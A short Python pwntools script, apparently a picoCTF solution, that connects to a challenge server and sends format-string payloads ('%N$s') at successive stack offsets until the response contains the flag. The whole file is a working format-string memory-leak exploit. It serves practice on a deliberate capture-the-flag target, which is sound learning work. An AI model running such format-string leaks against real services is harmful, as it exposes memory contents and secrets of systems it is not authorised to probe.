from pwn import *

host, port = 'saturn.picoctf.net', 55735

for i in range(65):
    connect = remote(host, port)
    connect.recvuntil(b'> ')

    connect.sendline('%' + str(i) + '$s')
    response = connect.recv()

    if b"CTF" in response:
        print(response)
        connect.close()
        break
    print(i, response)
    connect.close()

